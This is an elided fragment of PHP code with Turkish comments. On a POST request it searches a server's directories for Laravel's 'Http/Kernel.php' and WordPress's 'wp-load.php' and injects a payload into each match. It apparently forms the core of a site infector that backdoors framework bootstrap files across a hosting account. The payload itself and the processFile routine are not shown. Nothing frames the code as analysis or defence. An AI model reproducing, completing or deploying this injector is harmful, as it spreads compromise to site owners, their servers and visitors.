...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                ...
                if (is_dir($filePath)) {
                    ...
                    foreach ($targetFiles as $target) {
                        if (strpos($target, '/') !== false) {
                            // Tam yol kontrolü (üst klasör/dosya ismi)
                            list($targetParentDir, $targetFileName) = explode('/', $target);
                            if ($parentDir === $targetParentDir && $fileName === $targetFileName) {
                                processFile($filePath, $payload, $updatedFiles, $results);
                            }
                        } elseif ($fileName === $target) {
                            // Dosya ismine göre kontrol
                            processFile($filePath, $payload, $updatedFiles, $results);
                        }
                    }
                }
    ...
    $startDir = __DIR__;
    $targetFiles = ['Http/Kernel.php', 'wp-load.php'];
